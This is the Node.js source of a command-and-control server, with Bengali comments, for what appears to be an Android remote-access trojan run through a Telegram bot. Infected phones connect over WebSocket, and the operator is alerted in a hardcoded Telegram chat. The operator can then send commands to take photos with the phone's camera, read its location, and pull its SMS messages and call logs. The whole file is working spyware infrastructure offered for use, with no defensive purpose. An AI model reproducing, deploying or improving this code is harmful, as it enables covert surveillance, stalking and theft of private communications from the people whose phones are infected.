const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

const token = 'আপনার_নতুন_টোকেন_এখানে'; // নতুন টোকেন দিন
const id = '6541663008';
const DEVELOPER_NAME = "𝘾𝙮𝙗𝙚𝙧 𝙆𝙪𝙖𝙨𝙝𝙖";

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

app.use(bodyParser.json());

// কানেকশন লজিক
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || "Unknown Device";
    ws.uuid = uuid;
    ws.isAlive = true;

    // পিন চেক যাতে ডিসকানেক্ট না হয়
    ws.on('pong', () => { ws.isAlive = true; });

    appClients.set(uuid, { ws, model });
    appBot.sendMessage(id, `°• 𝙉𝙚𝙬 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b> 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙!`, { parse_mode: "HTML" });

    ws.on('close', () => {
        appBot.sendMessage(id, `°• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b> 𝘿𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙`, { parse_mode: "HTML" });
        appClients.delete(uuid);
    });
});

// কমান্ড মেনু এবং হ্যান্ডলিং
appBot.on('message', (message) => {
    if (message.chat.id == id && message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        if (appClients.size == 0) return appBot.sendMessage(id, "°• 𝙉𝙤 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙤𝙣𝙡𝙞𝙣𝙚");
        appClients.forEach((value, key) => {
            appBot.sendMessage(id, `• ᴍᴏᴅᴇʟ : <b>${value.model}</b>`, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "🎮 Execute Commands", callback_data: key }]]
                }
            });
        });
    }
});

appBot.on('callback_query', (query) => {
    const data = query.data;
    if (appClients.has(data)) {
        const client = appClients.get(data);
        appBot.sendMessage(id, `°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 <b>${client.model}</b>`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📸 Take Photo", callback_data: `camera_${data}` }, { text: "📍 Location", callback_data: `location_${data}` }],
                    [{ text: "📩 Get SMS", callback_data: `sms_${data}` }, { text: "📞 Call Logs", callback_data: `calls_${data}` }]
                ]
            }
        });
    } else if (data.includes('_')) {
        const [cmd, devId] = data.split('_');
        const client = appClients.get(devId);
        if (client && client.ws.readyState === webSocket.OPEN) {
            client.ws.send(cmd);
            appBot.answerCallbackQuery(query.id, { text: "Command Sent: " + cmd });
        } else {
            appBot.answerCallbackQuery(query.id, { text: "Device Offline!" });
        }
    }
});

// পিন ইন্টারভাল বাড়িয়ে ১৫ সেকেন্ড করা হয়েছে যাতে ডিসকানেক্ট না হয়
setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (!ws.isAlive) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 15000);

appServer.listen(process.env.PORT || 8999);